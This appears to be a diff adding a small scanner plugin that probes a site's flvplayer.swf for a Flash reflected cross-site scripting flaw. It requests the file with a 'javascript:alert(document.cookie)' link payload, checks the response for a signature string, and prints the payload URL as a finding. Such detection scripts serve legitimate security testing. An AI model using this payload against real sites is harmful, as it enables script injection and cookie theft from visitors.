@@ -1,0 +1,13 @@
+#request url = var
+#define payload = /static/image/common/flvplayer.swf?file=1.flv&linkfromdisplay=true&link=javascript:alert(document.cookie);
+#define bug = CWSL
+#define info = /static/image/common/flvplayer.swf?file=1.flv&linkfromdisplay=true&link=javascript:alert(document.cookie); |目标存在flash反射型xss
+
+function main(args)
+{
+	res = HttpGet(url.payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
+	if(StrFindStr(res[0],bug,0)!= "-1")
+	{
+		print(url.info);
+	}
+}
